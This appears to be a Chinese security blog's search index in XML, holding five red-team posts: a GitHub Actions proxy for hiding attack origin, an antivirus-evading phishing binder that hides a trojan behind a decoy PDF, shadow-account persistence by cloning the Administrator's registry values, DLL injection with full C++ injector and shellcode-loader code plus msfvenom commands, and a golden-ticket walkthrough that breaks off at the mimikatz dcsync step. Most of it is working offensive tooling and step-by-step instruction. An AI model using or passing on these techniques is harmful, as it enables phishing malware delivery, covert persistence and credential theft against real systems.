<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>搭建github代理</title>
      <link href="/2022/08/02/da-jian-github-dai-li/"/>
      <url>/2022/08/02/da-jian-github-dai-li/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建github代理"><a href="#搭建github代理" class="headerlink" title="搭建github代理"></a>搭建github代理</h1><h3 id="1-注册github账号"><a href="#1-注册github账号" class="headerlink" title="1.注册github账号"></a>1.注册github账号</h3><p><a href="https://github.com/signup">https://github.com/signup</a></p><p>这里我使用protonmail.com的邮箱进行注册</p><p><img src="image-20220802000733649.png"></p><p>选择不接受产品更新提醒就好，验证问题和邮箱验证码，成功创建</p><h3 id="2-获取github-token"><a href="#2-获取github-token" class="headerlink" title="2.获取github_token"></a>2.获取github_token</h3><p>前往<a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></p><p><img src="image-20220802010056669.png"></p><p>随意命名，勾上所有选项</p><p><img src="image-20220802010305700.png"></p><p>复制token的值</p><p><img src="image-20220802010341566.png"></p><h3 id="3-修改nps配置"><a href="#3-修改nps配置" class="headerlink" title="3.修改nps配置"></a>3.修改nps配置</h3><p>安装对应版本nps</p><p><a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><p>修改配置文件 </p><p>vim /etc/nps/conf/nps.conf</p><p><img src="image-20220802012444986.png"></p><p>记得把web面板的密码也改了(默认为123)</p><p>保存退出后使用tmux挂在后台</p><p>tmux new -s nps</p><p><img src="image-20220802013038720.png"></p><h3 id="4-拉取、配置脚本"><a href="#4-拉取、配置脚本" class="headerlink" title="4.拉取、配置脚本"></a>4.拉取、配置脚本</h3><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;sh3d0ww01f&#x2F;WaterDragon.gitcd WaterDragon&#x2F;vim main.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改文件</p><p><img src="image-20220802014047146.png"></p><p>运行脚本</p><pre class="line-numbers language-none"><code class="language-none">python3 main.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以自由add添加隧道</p><p><strong>密钥随意写，端口只要外网能通就可以，加密的话1代表要加密，0代表不加密</strong> <strong>③.配置好了新隧道，我们回到菜单使用</strong> 输入    <code>back</code> 回到菜单,然后<strong>键入<code>manager</code>进入Github Action管理</strong></p><p><img src="image-20220802015917036.png"></p><p>测试代理连通性</p><p><img src="image-20220802021251539.png"></p><p>也可以实现科学上网的效果</p><p>Action和SCF不一样 没有多出口 但是可以多开Action，然后实现多ip访问的目的</p>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web攻防 </tag>
            
            <tag> 防溯源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀钓鱼捆绑</title>
      <link href="/2022/05/20/mian-sha-diao-yu-kun-bang/"/>
      <url>/2022/05/20/mian-sha-diao-yu-kun-bang/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀钓鱼捆绑"><a href="#免杀钓鱼捆绑" class="headerlink" title="免杀钓鱼捆绑"></a>免杀钓鱼捆绑</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在实施钓鱼攻击的过程中，如果只是单纯的投递看起来什么都没做的木马，很容易引起受害者的怀疑，然后将机器关机或者直接发现攻击。</p><p>因此，最好将木马程序伪装成看起来正常处理的文件，所以我们可以通过捆绑正常文件的方法来达到这个目的，预期的效果就是受害人点击文件，文件释放出恶意程序和正常文件，恶意程序执行上线并且隐藏，正常文件也被正常执行且出现在当前目录，最后将捆绑程序删除，这样就达到了伪装的目的。</p><h2 id="小刚师傅的思路"><a href="#小刚师傅的思路" class="headerlink" title="小刚师傅的思路"></a>小刚师傅的思路</h2><p><code>https://mp.weixin.qq.com/s/0Lg866l7tpR7K8I6Ay5kxA</code></p><p>小刚师傅的思路是使用第三方图形库EasyX加载图片，接下来正常加载shellcode就行。</p><h2 id="NimFileBinder"><a href="#NimFileBinder" class="headerlink" title="NimFileBinder"></a>NimFileBinder</h2><p>NimFileBinder是使用Nim语言编写的一款捆绑工具，AV对非主流语言编写的工具检查没有那么严格，bypass能力较强。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>释放正常文件(文档、图片、PDF任何)</li><li>运行正常文件</li><li>内存中解密释放木马文件为xxx.txt(默认未开启，取消注释即可)</li><li>拷贝xxx.txt为xxx.exe</li><li>执行木马文件</li><li>自删除</li></ol><p><img src="1632810094_6152b46eea187f2aa5d3b.jpg!small" alt="捆绑器工作流程"></p><p>先安装nim，我这里使用kali安装的，安装 nim 在 Debian Stretch 在您的PC终端上执行以下命令。:</p><ol><li>我们执行这个命令来更新可用软件包的列表和它们的所有版本。</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>通过这个命令，我们将继续安装软件包</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install nim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>要检查你是否已经成功安装了软件包，你可以用下面的命令列出所有已安装的软件包。</li></ol><pre class="line-numbers language-none"><code class="language-none">dpkg -l nim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>如果发生了错误，我们建议你运行以下命令来清除缓存，并从步骤1开始重新安装</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>工具地址：<code>https://github.com/evilashz/NimFileBinder</code></p><p>到目录下编译，编译命令：<code>nim c --hints:off -d:release NimFileBender.nim</code></p><p>如果缺少模块会报相应错误，使用<code>nimble install</code>安装对应的模块即可（需要git），安装完strfmt，nimcrypto这两个模块就可以编译出可执行文件</p><p><img src="image-20211213181710429.png"></p><p>但是使用还是会遇到问题“打不开某个文件”，这里需要再安装一个模块winim。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><img src="image-20211213181312489.png"></p><p>传入三个参数，第一个参数为要隐藏的恶意程序，第二个参数为正常显示的文件，第三个参数是可以随意输入的Key值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./NimFileBender payload.exe 网络安全等级保护测评高风险判定指引.pdf moy1sec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211213182333642.png"></p><p>在目录下即生成<code>outfile.exe</code> ，执行该文件，payload.exe执行，且正常查看pdf文件</p><p><img src="image-20211213182629086.png"></p><p>此时目录下存在该pdf文件，而木马文件释放到了<code>C:\Windows\Temp</code>目录下.</p><p><img src="image-20211213182838931.png"></p><p>实战中需要修改outfile.exe的图标和文件名，诱使目标点击，这里不深究</p><h3 id="Vt检测"><a href="#Vt检测" class="headerlink" title="Vt检测"></a>Vt检测</h3><p>效果一般，不过主要是恶意程序本身的免杀。</p><p><img src="image-20211213183433612.png"></p>]]></content>
      
      
      <categories>
          
          <category> 钓鱼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 免杀 </tag>
            
            <tag> 钓鱼 </tag>
            
            <tag> 捆绑技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>影子账户权限维持</title>
      <link href="/2022/02/24/ying-zi-zhang-hu-quan-xian-wei-chi/"/>
      <url>/2022/02/24/ying-zi-zhang-hu-quan-xian-wei-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="影子账户权限维持"><a href="#影子账户权限维持" class="headerlink" title="影子账户权限维持"></a>影子账户权限维持</h1><h2 id="通过-创建隐藏用户"><a href="#通过-创建隐藏用户" class="headerlink" title="通过$创建隐藏用户"></a>通过$创建隐藏用户</h2><p><code>net user</code>命令查看目前的用户</p><p><img src="image-20220224151421424.png"></p><p>通过命令创建一个以$结尾的用户名，则这个用户为隐藏用户，这里创建一个名为hacker1$的用户</p><p><code>net user hacker1$ password /add</code> </p><p><img src="image-20220224151751762.png"></p><p>创建完成后，使用命令<code>net user</code>并没有找到刚刚创建的用户</p><p>使用命令<code>net user hacker1$</code>可以查看到这个隐藏用户的具体信息，证明了该隐藏用户创建成功</p><p><img src="image-20220224152022667.png"></p><p>不过在计算机管理中，本地用户和组中可以发现该用户</p><p><img src="image-20220224152531026.png"></p><p>在本地登陆页面中，也会有该隐藏用户的登陆选项，如果对方的机器位于本地，而不是远程服务器。那么，在他本地登录的时候，就可以看到当前在线的机器，从而暴露。</p><p><img src="image-20220224152729237.png"></p><h2 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h2><p>影子用户即创建的隐藏用户，它无法通过普通命令进行查询，只能在注册表中找到其详细信息。所以，如果我们要对该用户进行删除，只能在注册表中进行操作。</p><p>我们这里将刚刚创建的隐藏用户hacker1$变为影子用户</p><p>启动cmd，然后输入<code>regedit</code>，打开注册表。</p><p>我们要修改的注册表键值为<code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</code>，而默认情况下<code>SAM</code>键值只能由system进行修改。所以我们需要修改一下权限，如图：</p><p><img src="image-20220224153341729.png"></p><p>点击用户名，在右侧会有十六进制的数字，再通过这个对应的十六进制数字可以找到Users目录下与该十六进制相同的目录名，如这里就是hacker$对应的文件夹名为000003F6</p><p><img src="image-20220224153441158.png"></p><p>同理，找到Administrator的十六进制数字，我这里是1f4，故而打开000001F4</p><p><img src="image-20220224154218091.png"></p><p>我们可以看到有三个选项，双击F，复制里面的所有内容。</p><p>然后打开刚才说的000003F6，双击F，将刚才复制的内容粘贴上去，保存。</p><p>之后，分别右键Names中的hacker1$和000003F6两个目录，选择导出，将注册表导出。</p><p><img src="image-20220224154618151.png"></p><p>通过命令行执行删除用户hacker1</p><p><code>net user hacker1$ /del</code></p><p><img src="image-20220224154853844.png"></p><p>然后点击执行刚才导出的注册表文件</p><p>此时计算机管理和本地登陆中中就不会出现hacker1$，而hacker1$也获取到与被克隆用户一样的权限</p><p><img src="image-20220224161830141.png"></p><p>但是在注册表中仍然可以找到该影子账户的账户名，通过对比F值就可以排查出影子账户。</p><p><img src="image-20220224162039757.png"></p><p>这时候就可以通过影子账户建立后门达到权限维持的目的了。</p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 权限维持 </tag>
            
            <tag> 隐藏账户 </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL注入</title>
      <link href="/2021/12/06/dll-zhu-ru/"/>
      <url>/2021/12/06/dll-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><h2 id="DLL文件概述"><a href="#DLL文件概述" class="headerlink" title="DLL文件概述"></a>DLL文件概述</h2><p>DLL(Dynamic Link Library)文件为<code>动态链接库文件</code>，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p><p>程序在运行过程中需要使用函数时，会先将DLL文件载入进来，然后取得函数地址，最后进行调用，这样程序就不需要在运行之初就将所有代码加载进来。</p><h2 id="DLL注入原理"><a href="#DLL注入原理" class="headerlink" title="DLL注入原理"></a>DLL注入原理</h2><p>通俗的说，dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码，实质还是代码注入技术。</p><h2 id="DLL注入用途"><a href="#DLL注入用途" class="headerlink" title="DLL注入用途"></a>DLL注入用途</h2><ol><li>目标进程执行“预料之外”的功能。</li><li>需要一些手段来辅助调试被注入dll的进程</li><li>为目标进程安装钩子程序(API Hook)</li></ol><h2 id="DLL注入大致步骤"><a href="#DLL注入大致步骤" class="headerlink" title="DLL注入大致步骤"></a>DLL注入大致步骤</h2><ol><li><p> 附加到目标/远程进程</p></li><li><p>在目标/远程进程内分配内存</p></li><li><p>将DLL文件路径，或者DLL文件，复制到目标/远程进程的内存空间</p></li><li><p>控制进程运行DLL文件</p></li></ol><h2 id="多种多样的DLL注入技术"><a href="#多种多样的DLL注入技术" class="headerlink" title="多种多样的DLL注入技术"></a>多种多样的DLL注入技术</h2><p>如今，有很多种方式可以实现DLL注入，主要技术有以下几种</p><ul><li><p>CreateRemoteThread()</p></li><li><p>NtCreateThreadEx()</p></li><li><p>QueueUserAPC</p></li><li><p>SetWindowsHookEx()</p></li><li><p>RtlCreateUserThread()</p></li><li><p>利用SetThreadContext()找到的代码区域</p></li><li><p>反射DLL</p></li></ul><p>而不管是哪种技术都会大致符合DLL注入的大致步骤。</p><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p><code>CreateRemoteThread</code> 是最传统和最流行的DLL注入技术。</p><p>1.使用OpenProcess()函数打开目标进程</p><p>2.通过调用GetProAddress()函数找到LoadLibrary()函数的地址</p><p>3.通过调用VirtualAllocEx()函数在目标/远程进程地址空间中为DLL文件路径开辟内存空间</p><p>4.调用WriteProcessMemory()函数在之前所分配的内存空间中写入DLL文件路径</p><p>5.调用CreateRemoteThread()函数创建一个新的线程，新线程以DLL文件路径名称作为参数来调用LoadLibrary()函数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &quot;stdlib.h&quot;#include &lt;tchar.h&gt;#include &lt;Windows.h&gt;bool Inject(DWORD dwId, WCHAR* szPath)&#x2F;&#x2F;参数1：目标进程PID  参数2：DLL路径&#123;&#x2F;&#x2F;一、在目标进程中申请一个空间&#x2F;*【1.1 获取目标进程句柄】参数1：想要拥有的进程权限（本例为所有能获得的权限）参数2：表示所得到的进程句柄是否可以被继承参数3：被打开进程的PID返回值:指定进程的句柄*&#x2F;HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);&#x2F;*【1.2 在目标进程的内存里开辟空间】参数1：目标进程句柄参数2：保留页面的内存地址，一般用NULL自动分配参数3：欲分配的内存大小，字节单位参数4：MEM_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储参数5：PAGE_READWRITE 区域可被应用程序读写返回值：执行成功就返回分配内存的首地址，不成功就是NULL*&#x2F;LPVOID pRemoteAddress &#x3D; VirtualAllocEx(hProcess,NULL,1,MEM_COMMIT,PAGE_READWRITE);&#x2F;&#x2F;二、 把dll的路径写入到目标进程的内存空间中DWORD dwWriteSize &#x3D; 0;&#x2F;*【写一段数据到刚才给指定进程所开辟的内存空间里】参数1：OpenProcess返回的进程句柄参数2：准备写入的内存首地址参数3：指向要写的数据的指针（准备写入的东西）参数4：要写入的字节数（东西的长度+0&#x2F;）参数5： 返回值。返回实际写入的字节*&#x2F;WriteProcessMemory(hProcess, pRemoteAddress, szPath, wcslen(szPath) * 2 + 2, &amp;dwWriteSize);&#x2F;&#x2F;三、 创建一个远程线程，让目标进程调用LoadLibrary&#x2F;*参数1：该远程线程所属进程的进程句柄参数2：一个指向 SECURITY_ATTRIBUTES 结构的指针, 该结构指定了线程的安全属性参数3：线程栈初始大小,以字节为单位,如果该值设为0,那么使用系统默认大小参数4：在远程进程的地址空间中,该线程的线程函数的起始地址（也就是这个线程具体要干的活儿）参数5：传给线程函数的参数（刚才在内存里开辟的空间里面写入的东西）参数6：控制线程创建的标志。0（NULL）表示该线程在创建后立即运行参数7：指向接收线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符返回值：如果函数成功，则返回值是新线程的句柄。如果函数失败，则返回值为NULL*&#x2F;HANDLE hThread &#x3D; CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)LoadLibrary,pRemoteAddress,NULL,NULL);WaitForSingleObject(hThread, -1); &#x2F;&#x2F;当句柄所指的线程有信号的时候，才会返回&#x2F;*四、 【释放申请的虚拟内存空间】参数1：目标进程的句柄。该句柄必须拥有 PROCESS_VM_OPERATION 权限参数2：指向要释放的虚拟内存空间首地址的指针参数3：虚拟内存空间的字节数参数4：MEM_DECOMMIT仅标示内存空间不可用，内存页还将存在。   MEM_RELEASE这种方式很彻底，完全回收。*&#x2F;VirtualFreeEx(hProcess, pRemoteAddress, 1, MEM_DECOMMIT);return 0;&#125;int _tmain(int argc, _TCHAR * argv[])&#123;wchar_t wStr[] &#x3D; L&quot;E:\\inject.dll&quot;;DWORD dwId &#x3D; 0;&#x2F;&#x2F;参数1：(NULL&#x2F;&#x2F;参数2：目标窗口的标题&#x2F;&#x2F;返回值：目标窗口的句柄HWND hCalc &#x3D; FindWindow(NULL, L&quot;微信&quot;);printf(&quot;目标窗口的句柄为:%d\n&quot;, hCalc);DWORD dwPid &#x3D; 0;&#x2F;&#x2F;参数1：目标进程的窗口句柄&#x2F;&#x2F;参数2：把目标进程的PID存放进去DWORD dwRub &#x3D; GetWindowThreadProcessId(hCalc, &amp;dwPid);printf(&quot;目标窗口的进程PID为:%d\n&quot;, dwPid);&#x2F;&#x2F;参数1：目标进程的PID&#x2F;&#x2F;参数2：想要注入DLL的路径Inject(dwPid, wStr);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里再生成一个具有弹窗功能的DLL文件，代码如下</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;windows.h&gt;#include &quot;pch.h&quot;DWORD WINAPI runBot(LPVOID lpParam) &#123;&#x2F;&#x2F; 此处可以写具体的bot代码return 1;&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:MessageBoxA(NULL, &quot;DLL Attached!\n&quot;, &quot;Game Hacking&quot;, MB_OK | MB_TOPMOST);CreateThread(NULL, 0, &amp;runBot, NULL, 0, NULL);break;&#125;return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的dll文件放入E盘下，执行dll_inject.exe</p><p><img src="image-20211204210514823.png"></p><p><img src="image-20211204210809782.png"></p><p>此时，已经将inject.dll注入到微信程序中了</p><p>或者将用dll加载shellcode</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;HANDLE hThread &#x3D; NULL;typedef void(__stdcall* JMP_SHELLCODE)();unsigned char shellcode[193] &#x3D; &#123;0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,0xE5, 0x31, 0xC0, 0x64, 0x8B, 0x50, 0x30, 0x8B,0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C,0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D,0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78,0xE3, 0x48, 0x01, 0xD1, 0x51, 0x8B, 0x59, 0x20,0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49,0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC,0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75,0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66,0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3,0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24,0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF,0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D,0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF,0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x68, 0xA6,0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C,0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,0x13, 0x72, 0x6F, 0x6A, 0x00, 0x53, 0xFF, 0xD5,0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65,0x00&#125;;DWORD WINAPI jmp_shellcode(LPVOID pPara)&#123;LPVOID lpBase &#x3D; VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(lpBase, shellcode, sizeof(shellcode));JMP_SHELLCODE jmp_shellcode &#x3D; (JMP_SHELLCODE)lpBase;jmp_shellcode();return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:hThread &#x3D; CreateThread(NULL, 0, jmp_shellcode, 0, 0, 0);case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="具有微软签名可利用的注入的程序"><a href="#具有微软签名可利用的注入的程序" class="headerlink" title="具有微软签名可利用的注入的程序"></a>具有微软签名可利用的注入的程序</h2><p>国外安全研究员发现了2个具有微软签名的二进制文件可以进行 DLL 注入。链接：<a href="https://github.com/mrd0x/dll_inject_vs_binaries">https://github.com/mrd0x/dll_inject_vs_binaries</a></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec cmd&#x3D;calc.exe -f dll -o calc32.dll # 生成32位dllmsfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;calc.exe -f dll -o calc64.dll # 生成64位dllmsfvenom -a x64 --platform windows -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&quot;calc.exe&quot; -f dll -o calc.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先编写一个程序，也可以利用记事本的进程</p><pre class="line-numbers language-none"><code class="language-none">taskkill &#x2F;f &#x2F;im notepad.exe &#x2F;&#x2F;杀死记事本进程notepad &amp;&amp; tasklist |find &quot;notepad.exe&quot; &#x2F;&#x2F;找到记事本进程的pid。inject_dll_amd64.exe 11904 D:dll_inject_vs_binariescalc64.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;int main()&#123;    std::cout &lt;&lt; &quot;Hello World!\n&quot;;getchar();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到这个程序的pid为6012</p><p>利用注入程序<code>inject_dll_amd64.exe 6012 calc.dll</code></p><p><img src="image-20211205212229286.png"></p><p>这里的dll可以使用msfvenom生成，也能使用go编译dll</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// calc.go</span><span class="token keyword">package</span> main<span class="token comment">//#include "main.h"</span><span class="token comment">//regenerate cgo definitions</span><span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"os/exec"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token boolean">_</span> <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> isRunning <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">func</span> RunSliver <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token operator">!</span>isRunning<span class="token punctuation">&#123;</span>        isRunning <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Dllinstall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>go build -ldflags &quot;-s -w&quot; -buildmode=c-shared -o calc2.dll calc.go</code></p><p>cs生成的dll也成功通过该种方式注入到程序之中</p><p><img src="image-20211206190047314.png"></p><p>总的来说，就是：先在目标进程的内存空间里开辟一块新地方，往新地方里面写入DLL的路径，再创建远程线程找到LoadLibrary() 函数，并在刚才开辟的新地方中读取DLL路径，进而加载我们自己写的DLL</p>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL </tag>
            
            <tag> Av </tag>
            
            <tag> Windows编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄金票据</title>
      <link href="/2021/12/02/huang-jin-piao-ju/"/>
      <url>/2021/12/02/huang-jin-piao-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p><p>关于Kerberos认证可以参考下面的链接 ，<a href="https://daiker.gitbook.io/windows-protocol/">https://daiker.gitbook.io/windows-protocol/</a></p><h2 id="制作黄金票据条件"><a href="#制作黄金票据条件" class="headerlink" title="制作黄金票据条件"></a>制作黄金票据条件</h2><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM-HASH</li><li>伪造用户名，可以是任意用户名</li></ol><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="获取域名称和域控机器名"><a href="#获取域名称和域控机器名" class="headerlink" title="获取域名称和域控机器名"></a>获取域名称和域控机器名</h3><p>通过命令<code>systeminfo</code>可以获取到域名为sun.com</p><p><img src="image-20211201205736350.png"></p><p><code>net config workstation</code> 也可以获取到域名和其他信息</p><p><img src="image-20211202083848058.png"></p><p><code>nltest /DCLTST:域名</code></p><p>或者 <code>ping -a 域控ip</code></p><p><img src="image-20211202084423503.png"></p><h3 id="获取SID的值"><a href="#获取SID的值" class="headerlink" title="获取SID的值"></a>获取SID的值</h3><p>用户SID去掉后三位即为域SID，这里的域SID即S-1-5-21-3388020223-1982701712-4030140183</p><p><img src="image-20211201210109132.png"></p><h3 id="获取krbtgt的哈希值"><a href="#获取krbtgt的哈希值" class="headerlink" title="获取krbtgt的哈希值"></a>获取krbtgt的哈希值</h3><p>通过mimikatz中的  <code>lsadump::dcsync /domain:superman.com /user:krbtgt</code>命令获取krbtgt的哈希值，也可以使用hashdump获取</p><p><img 